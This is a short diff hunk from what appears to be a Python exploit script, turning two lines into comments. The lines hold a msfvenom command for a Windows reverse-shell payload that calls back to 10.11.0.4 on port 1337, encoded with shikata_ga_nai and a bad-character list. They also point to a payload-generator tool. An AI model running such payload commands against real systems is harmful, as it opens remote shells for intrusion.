@@ -55,7 +55,7 @@ if __name__ == '__main__':
 	main()
 	
 # Sample payload with Msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=1337 EXITFUNC=
-thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
+# thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
 
-Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options! 
+# Or use Vengen (https://github.com/binexisHATT/Vengen) to generate payloads with your custom options! 
 ```
